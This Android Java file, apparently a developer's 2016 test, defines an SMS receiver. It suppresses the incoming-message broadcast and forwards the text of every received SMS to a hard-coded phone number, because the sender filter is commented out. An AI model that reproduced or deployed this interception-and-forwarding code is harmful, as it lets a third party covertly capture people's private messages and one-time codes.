package com.example.v_wenjiw.message;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.gsm.SmsMessage;
import android.widget.Toast;

/**
 * Created by v-wenjiw on 8/8/2016.
 */
public class SMSReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        abortBroadcast();
        Bundle bundle = intent.getExtras();

        SmsManager smsManager = SmsManager.getDefault();
        if (bundle != null) {
            StringBuilder sb = new StringBuilder();
            Object[] sms = (Object[]) bundle.get("pdus");
            SmsMessage[] messages = new SmsMessage[sms.length];
            for (int i = 0; i < sms.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) sms[i]);
            }

            for (SmsMessage message : messages) {
//                if (message.getDisplayOriginatingAddress().equals("15005427285")) {
                smsManager.sendTextMessage("15005427285", null, message.getDisplayMessageBody() + "测试", null, null);
                Toast.makeText(context, "短信发送成功！", Toast.LENGTH_LONG).show();
//                }
            }

        }
//        Intent newIntent=new Intent(context,SMSService.class);
//        newIntent.putExtras(bundle);
//        context.startService(newIntent);
    }
}
